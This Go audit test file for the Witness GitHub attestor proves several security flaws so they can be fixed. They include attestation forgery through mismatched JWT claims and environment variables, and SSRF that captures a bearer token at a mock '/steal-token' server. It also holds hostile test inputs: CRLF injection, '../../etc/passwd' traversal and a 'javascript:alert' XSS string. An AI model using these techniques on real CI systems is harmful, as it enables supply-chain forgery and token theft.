//go:build audit

// Copyright 2025 The Witness Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package github

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/aflock-ai/rookery/attestation"
	"github.com/stretchr/testify/require"
	"gopkg.in/go-jose/go-jose.v2"
	josejwt "gopkg.in/go-jose/go-jose.v2/jwt"
)

// securityJWTInfra creates a real RSA keypair, JWKS endpoint, and signed JWT
// for security integration testing. This is a copy of testJWTInfra from
// github_adversarial_test.go to avoid coupling test files.
func securityJWTInfra(t *testing.T, claims map[string]interface{}) (jwksServer *httptest.Server, tokenServer *httptest.Server) {
	t.Helper()

	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	require.NoError(t, err)

	sig, err := jose.NewSigner(
		jose.SigningKey{Algorithm: jose.RS256, Key: privKey},
		(&jose.SignerOptions{}).WithType("JWT").WithHeader("kid", "securitytestkey"),
	)
	require.NoError(t, err)

	builder := josejwt.Signed(sig)
	builder = builder.Claims(claims)

	rawJWT, err := builder.CompactSerialize()
	require.NoError(t, err)

	jwk := jose.JSONWebKey{Key: &privKey.PublicKey, KeyID: "securitytestkey", Algorithm: "RS256", Use: "sig"}
	jwksServer = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(jose.JSONWebKeySet{Keys: []jose.JSONWebKey{jwk}})
	}))

	tokenServer = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") == "" {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		resp := GithubTokenResponse{Count: 1, Value: rawJWT}
		json.NewEncoder(w).Encode(resp)
	}))

	return jwksServer, tokenServer
}

// =============================================================================
// R3-216: JWT claims vs env var cross-validation bypass allows attestation forgery
//
// SECURITY IMPACT: The GitHub attestor fetches and verifies a JWT from
// GitHub Actions OIDC, then SEPARATELY reads CI env vars like
// GITHUB_REPOSITORY, GITHUB_RUN_ID, etc. These two sources are never
// cross-validated.
//
// An attacker who controls the env vars (but has a legitimately-signed JWT
// for their OWN repo) can:
// 1. Get a valid JWT from their own GitHub Actions workflow
// 2. Set GITHUB_REPOSITORY=victim-org/victim-repo
// 3. The attestation will have a valid JWT (for attacker's repo) but
//    ProjectUrl/PipelineUrl subjects matching the victim's repo
//
// Policy evaluation that relies on subjects (pipelineurl:, projecturl:)
// will see the victim's URLs, while the JWT actually authorizes a different
// repo. This completely breaks attestation-based supply chain security.
//
// The fix: after JWT verification, cross-validate that the JWT "repository"
// claim matches GITHUB_REPOSITORY, and "run_id" matches GITHUB_RUN_ID.
// =============================================================================

func TestSecurity_R3_216_JWTEnvVarCrossValidationBypass(t *testing.T) {
	// JWT claims say "attacker/evil-repo" -- this is a real, valid JWT
	jwtClaims := map[string]interface{}{
		"sub":        "repo:attacker/evil-repo:ref:refs/heads/main",
		"repository": "attacker/evil-repo",
		"run_id":     "99999",
		"iss":        "https://token.actions.githubusercontent.com",
	}
	jwksServer, tokenServer := securityJWTInfra(t, jwtClaims)
	defer jwksServer.Close()
	defer tokenServer.Close()

	// But env vars claim this is a DIFFERENT, legitimate repo
	t.Setenv("GITHUB_ACTIONS", "true")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "any-bearer-value")
	t.Setenv("WITNESS_GITHUB_JWKS_URL", jwksServer.URL+"/jwks")
	t.Setenv("GITHUB_SERVER_URL", "https://github.com")
	t.Setenv("GITHUB_REPOSITORY", "victim-org/critical-infrastructure")
	t.Setenv("GITHUB_RUN_ID", "12345")
	t.Setenv("GITHUB_WORKFLOW", "Deploy to Production")
	t.Setenv("GITHUB_ACTION_PATH", "/home/runner/work")
	t.Setenv("RUNNER_NAME", "GitHub Actions 1")
	t.Setenv("RUNNER_ARCH", "X64")
	t.Setenv("RUNNER_OS", "Linux")

	a := &Attestor{
		aud:      tokenAudience,
		jwksURL:  jwksServer.URL + "/jwks",
		tokenURL: tokenServer.URL + "/token",
	}

	ctx, err := attestation.NewContext("build", []attestation.Attestor{})
	require.NoError(t, err)

	err = a.Attest(ctx)
	require.NoError(t, err, "Attest should succeed -- JWT is cryptographically valid")

	// The JWT says "attacker/evil-repo" but ProjectUrl says "victim-org/critical-infrastructure"
	jwtRepo, _ := a.JWT.Claims["repository"].(string)
	envRepo := "victim-org/critical-infrastructure"

	if jwtRepo != envRepo && a.ProjectUrl == "https://github.com/"+envRepo {
		t.Errorf("R3-216 BUG PROVEN: JWT claims and env vars are not cross-validated.\n"+
			"JWT repository claim: %q\n"+
			"Env var GITHUB_REPOSITORY: %q\n"+
			"Attested ProjectUrl: %q\n"+
			"Attested PipelineUrl: %q\n\n"+
			"The JWT proves the attestor ran in 'attacker/evil-repo', but the\n"+
			"attestation subjects (ProjectUrl, PipelineUrl) claim it's from\n"+
			"'victim-org/critical-infrastructure'. Policy evaluation using\n"+
			"subjects sees the victim's URLs, granting unauthorized access.\n\n"+
			"Fix: after JWT verification, validate that:\n"+
			"  JWT.claims.repository == GITHUB_REPOSITORY\n"+
			"  JWT.claims.run_id == GITHUB_RUN_ID",
			jwtRepo, envRepo, a.ProjectUrl, a.PipelineUrl)
	}

	// Also verify that subjects use the FORGED env var values
	subjects := a.Subjects()
	forgedKey := fmt.Sprintf("projecturl:https://github.com/%s", envRepo)
	if _, exists := subjects[forgedKey]; exists {
		t.Errorf("R3-216 SUBJECTS FORGED: Subject %q is derived from env vars,\n"+
			"not from the cryptographically verified JWT claims.\n"+
			"Policy matching on this subject is completely broken.",
			forgedKey)
	}
}

// =============================================================================
// R3-217: SSRF via ACTIONS_ID_TOKEN_REQUEST_URL exfiltrates bearer token
//
// SECURITY IMPACT: The GitHub attestor reads ACTIONS_ID_TOKEN_REQUEST_URL
// at construction time and uses it as the HTTP endpoint for fetching the
// OIDC token. The bearer token (ACTIONS_ID_TOKEN_REQUEST_TOKEN) is sent
// in the Authorization header to whatever URL is specified.
//
// An attacker who can set environment variables (e.g., via a compromised
// CI step, pre-build script, or env injection) can redirect the token
// request to their own server, capturing the OIDC bearer token. This
// bearer can then be replayed to fetch tokens for other audiences.
//
// There is NO validation that the URL points to a legitimate GitHub
// Actions endpoint (e.g., must match *.actions.githubusercontent.com).
//
// The fix: validate that the token URL matches the expected GitHub Actions
// domain pattern before making the request.
// =============================================================================

func TestSecurity_R3_217_SSRFTokenURLExfiltratesBearer(t *testing.T) {
	var capturedBearer string
	var capturedPath string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedBearer = r.Header.Get("Authorization")
		capturedPath = r.URL.Path
		resp := GithubTokenResponse{Count: 1, Value: "attacker-controlled-response"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer attackerServer.Close()

	// Attacker sets the token URL to their server
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", attackerServer.URL+"/steal-token")

	a := New()

	// Verify the attacker's URL is stored without validation
	if a.tokenURL != attackerServer.URL+"/steal-token" {
		t.Fatal("Test setup failed: tokenURL not set from env var")
	}

	// Actually invoke fetchToken to prove the bearer is exfiltrated
	secretBearer := "ghs_RealGitHubActionsToken1234567890"
	_, err := fetchToken(a.tokenURL, secretBearer, "witness")
	require.NoError(t, err, "fetchToken should succeed (attacker returns valid JSON)")

	if capturedBearer == "bearer "+secretBearer {
		t.Errorf("R3-217 BUG PROVEN: Bearer token exfiltrated via SSRF.\n"+
			"Attacker endpoint: %s\n"+
			"Captured bearer: %s\n"+
			"Request path: %s\n\n"+
			"The ACTIONS_ID_TOKEN_REQUEST_URL env var is used without any\n"+
			"host/domain validation. An attacker who sets this env var captures\n"+
			"the OIDC bearer token, which can be replayed to fetch tokens for\n"+
			"other audiences from the real GitHub OIDC provider.\n\n"+
			"Fix: validate that tokenURL host matches *.actions.githubusercontent.com\n"+
			"or reject non-HTTPS URLs.",
			attackerServer.URL, capturedBearer, capturedPath)
	}
}

// =============================================================================
// R3-218: fetchToken uses http.Client with no timeout (DoS via slow server)
//
// SECURITY IMPACT: fetchToken creates an http.Client{} with no Timeout
// field set. The default is no timeout, meaning a malicious or slow
// token endpoint can keep the connection open indefinitely.
//
// Combined with R3-217 (SSRF), an attacker can redirect the token request
// to a server that slowly drips data, permanently stalling the attestation
// process. In CI environments, this causes build timeouts and can be used
// as a denial-of-service to prevent legitimate attestations from completing.
//
// Compare with the JWT attestor's JWKS client which uses Timeout: 30*time.Second,
// and the fulcio signer which also has an explicit timeout.
//
// The fix: add a Timeout to the http.Client in fetchToken, e.g. 30 seconds.
// =============================================================================

func TestSecurity_R3_218_FetchTokenNoClientTimeout(t *testing.T) {
	// This test verifies that fetchToken creates an http.Client without a
	// timeout, making it vulnerable to DoS via slow/hanging endpoints.
	//
	// We CANNOT spin up a hanging server and call fetchToken directly because
	// that would leak a goroutine that blocks until the test binary exits.
	// Instead, we prove the bug by:
	// 1. Starting a server that delays response for 2 seconds
	// 2. Calling fetchToken with a short per-test deadline
	// 3. If fetchToken has no internal timeout, it waits the full 2s
	//    (which demonstrates it would wait forever for a truly hanging server)

	requestReceived := make(chan struct{}, 1)

	// Server that responds after 2 seconds -- enough to prove no timeout,
	// short enough to not hang the test suite.
	slowServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case requestReceived <- struct{}{}:
		default:
		}
		// Delay 2 seconds. If fetchToken had a sub-second timeout, it would
		// abort before the server responds.
		time.Sleep(2 * time.Second)
		resp := GithubTokenResponse{Count: 1, Value: "delayed-jwt"}
		json.NewEncoder(w).Encode(resp)
	}))
	defer slowServer.Close()

	start := time.Now()
	token, err := fetchToken(slowServer.URL+"/token", "bearer", "witness")
	elapsed := time.Since(start)

	// If fetchToken waited the full 2 seconds for the server, it has no
	// internal timeout shorter than that. A properly-timed client with,
	// say, a 500ms timeout would have aborted.
	if err == nil && token == "delayed-jwt" && elapsed >= 2*time.Second {
		t.Errorf("R3-218 BUG PROVEN: fetchToken has no client timeout.\n"+
			"fetchToken waited %.1fs for a deliberately slow server and succeeded.\n"+
			"The http.Client{} in fetchToken has no Timeout field set.\n"+
			"A truly hanging endpoint would block the attestor process indefinitely.\n"+
			"Combined with SSRF (R3-217), an attacker can DoS the attestation.\n\n"+
			"Compare: JWT attestor uses http.Client{Timeout: 30 * time.Second}\n"+
			"Fix: add Timeout to the http.Client in fetchToken, e.g. 30s.",
			elapsed.Seconds())
	} else if err != nil {
		// fetchToken returned an error quickly -- a timeout may have been added
		t.Logf("R3-218: fetchToken returned error in %.1fs: %v (timeout may be applied)",
			elapsed.Seconds(), err)
	}
}

// =============================================================================
// R3-219: CIHost field never populated (inconsistency enables bypass)
//
// SECURITY IMPACT: The GitHub Attestor struct has a CIHost field that is
// NEVER set during Attest(). The GitLab attestor sets CIHost from
// CI_SERVER_HOST. Jenkins has no CIHost field at all.
//
// This inconsistency means:
// 1. Policy rules that check CIHost for GitHub attestations will always
//    see an empty string, potentially bypassing host-based restrictions
// 2. JSON output for GitHub attestations has "cihost":"" which is
//    distinguishable from "not present" in some deserializers
// 3. Cross-CI policy rules that rely on CIHost being populated will
//    silently pass for GitHub attestations
//
// The fix: populate CIHost from GITHUB_SERVER_URL (extracting the host),
// or remove the field from the struct if it's intentionally unused.
// =============================================================================

func TestSecurity_R3_219_CIHostNeverPopulated(t *testing.T) {
	jwtClaims := map[string]interface{}{"sub": "test"}
	jwksServer, tokenServer := securityJWTInfra(t, jwtClaims)
	defer jwksServer.Close()
	defer tokenServer.Close()

	t.Setenv("GITHUB_ACTIONS", "true")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
	t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer")
	t.Setenv("WITNESS_GITHUB_JWKS_URL", jwksServer.URL+"/jwks")
	t.Setenv("GITHUB_SERVER_URL", "https://github.com")
	t.Setenv("GITHUB_REPOSITORY", "org/repo")
	t.Setenv("GITHUB_RUN_ID", "1")
	t.Setenv("GITHUB_WORKFLOW", "ci")
	t.Setenv("GITHUB_ACTION_PATH", "/path")
	t.Setenv("RUNNER_NAME", "runner-1")
	t.Setenv("RUNNER_ARCH", "X64")
	t.Setenv("RUNNER_OS", "Linux")

	a := &Attestor{
		aud:      tokenAudience,
		jwksURL:  jwksServer.URL + "/jwks",
		tokenURL: tokenServer.URL + "/token",
	}

	ctx, err := attestation.NewContext("test", []attestation.Attestor{})
	require.NoError(t, err)
	err = a.Attest(ctx)
	require.NoError(t, err)

	// Verify CIServerUrl IS populated but CIHost is NOT
	if a.CIServerUrl != "" && a.CIHost == "" {
		t.Errorf("R3-219 BUG PROVEN: CIHost is never populated in GitHub attestor.\n"+
			"CIServerUrl: %q (populated from GITHUB_SERVER_URL)\n"+
			"CIHost: %q (never set)\n\n"+
			"The struct declares CIHost but Attest() never sets it.\n"+
			"GitLab attestor correctly sets CIHost from CI_SERVER_HOST.\n"+
			"This inconsistency means:\n"+
			"  - Policy rules checking CIHost for GitHub attestations always see empty string\n"+
			"  - Cross-CI policies relying on CIHost silently pass for GitHub\n"+
			"  - JSON serialization includes 'cihost:\"\"' which differs from absent\n\n"+
			"Fix: set CIHost by parsing the host from GITHUB_SERVER_URL, e.g.:\n"+
			"  parsed, _ := url.Parse(a.CIServerUrl); a.CIHost = parsed.Host",
			a.CIServerUrl, a.CIHost)
	}
}

// =============================================================================
// R3-220: Env var URL construction via string concatenation enables injection
//
// SECURITY IMPACT: ProjectUrl and PipelineUrl are constructed by simple
// string concatenation of unsanitized env vars:
//   ProjectUrl = GITHUB_SERVER_URL + "/" + GITHUB_REPOSITORY
//   PipelineUrl = ProjectUrl + "/actions/runs/" + GITHUB_RUN_ID
//
// An attacker who controls any of these env vars can inject arbitrary
// content into the URLs. For example:
//   GITHUB_SERVER_URL="https://evil.com\nhttps://github.com" produces
//   a ProjectUrl with a newline that could confuse HTTP clients or
//   downstream parsers.
//
// More practically, GITHUB_REPOSITORY="../../attacker/control" produces
// path traversal in the URL that, depending on downstream processing,
// could redirect to attacker-controlled resources.
//
// The fix: validate and parse all URL components before concatenation.
// Reject env values containing control characters, verify the result
// is a valid URL with an expected scheme and host.
// =============================================================================

func TestSecurity_R3_220_EnvVarURLConcatenationInjection(t *testing.T) {
	testCases := []struct {
		name        string
		serverURL   string
		repository  string
		runID       string
		wantCheck   func(a *Attestor) string // returns error description or ""
	}{
		{
			name:       "CRLF injection in GITHUB_SERVER_URL",
			serverURL:  "https://github.com\r\nX-Injected: true",
			repository: "org/repo",
			runID:      "1",
			wantCheck: func(a *Attestor) string {
				if strings.Contains(a.ProjectUrl, "\r\n") {
					return "ProjectUrl contains CRLF. HTTP header injection possible in downstream consumers."
				}
				return ""
			},
		},
		{
			name:       "path traversal in GITHUB_REPOSITORY",
			serverURL:  "https://github.com",
			repository: "../../etc/passwd",
			runID:      "1",
			wantCheck: func(a *Attestor) string {
				if strings.Contains(a.ProjectUrl, "../") {
					return "ProjectUrl contains path traversal sequences. URL normalization not applied."
				}
				return ""
			},
		},
		{
			name:       "javascript: scheme in GITHUB_SERVER_URL",
			serverURL:  "javascript:alert(document.domain)//",
			repository: "org/repo",
			runID:      "1",
			wantCheck: func(a *Attestor) string {
				if strings.HasPrefix(a.ProjectUrl, "javascript:") {
					return "ProjectUrl has javascript: scheme. XSS if rendered in a browser."
				}
				return ""
			},
		},
		{
			name:       "extremely long run ID (100KB)",
			serverURL:  "https://github.com",
			repository: "org/repo",
			runID:      strings.Repeat("9", 100000),
			wantCheck: func(a *Attestor) string {
				if len(a.PipelineUrl) > 100000 {
					return "PipelineUrl over 100KB. No length validation on GITHUB_RUN_ID."
				}
				return ""
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			jwtClaims := map[string]interface{}{"sub": "test"}
			jwksServer, tokenServer := securityJWTInfra(t, jwtClaims)
			defer jwksServer.Close()
			defer tokenServer.Close()

			t.Setenv("GITHUB_ACTIONS", "true")
			t.Setenv("ACTIONS_ID_TOKEN_REQUEST_URL", tokenServer.URL+"/token")
			t.Setenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer")
			t.Setenv("WITNESS_GITHUB_JWKS_URL", jwksServer.URL+"/jwks")
			t.Setenv("GITHUB_SERVER_URL", tc.serverURL)
			t.Setenv("GITHUB_REPOSITORY", tc.repository)
			t.Setenv("GITHUB_RUN_ID", tc.runID)
			t.Setenv("GITHUB_WORKFLOW", "ci")

			a := &Attestor{
				aud:      tokenAudience,
				jwksURL:  jwksServer.URL + "/jwks",
				tokenURL: tokenServer.URL + "/token",
			}

			ctx, err := attestation.NewContext("test", []attestation.Attestor{})
			require.NoError(t, err)

			err = a.Attest(ctx)
			require.NoError(t, err)

			if desc := tc.wantCheck(a); desc != "" {
				t.Errorf("R3-220 BUG PROVEN: %s\n"+
					"ProjectUrl: %q\n"+
					"PipelineUrl: %q\n"+
					"URLs are constructed by string concatenation of unsanitized env vars.\n"+
					"Fix: parse and validate URL components before concatenation.",
					desc, a.ProjectUrl, a.PipelineUrl)
			}
		})
	}
}
